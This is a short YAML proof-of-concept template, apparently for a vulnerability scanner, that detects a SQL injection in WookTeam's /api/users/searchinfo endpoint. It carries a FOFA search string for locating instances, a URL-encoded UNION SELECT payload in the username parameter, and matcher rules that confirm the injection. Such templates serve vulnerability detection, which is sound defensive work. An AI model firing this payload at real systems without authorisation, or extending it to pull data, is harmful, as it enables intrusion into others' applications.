id: poc-yaml-wookteam-searchinfo-sqli
info:
  name: WookTeam searchinfo SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: wookteam
  fofa: title="Wookteam"
variables:
  t1: random_int(100,1000)
  t2: md5(t1)
requests:
- method: GET
  path: /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cmd5%28{{.t1}}%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23
  expression: "status_code == 200 && \ncontains(body,\"\\\"username\\\":\") &&\ncontains(body,t2)\
    \ &&\ncontains(headers,\"wookteam_session=\") &&\n!contains(body,\"<\")\n"
transport: http
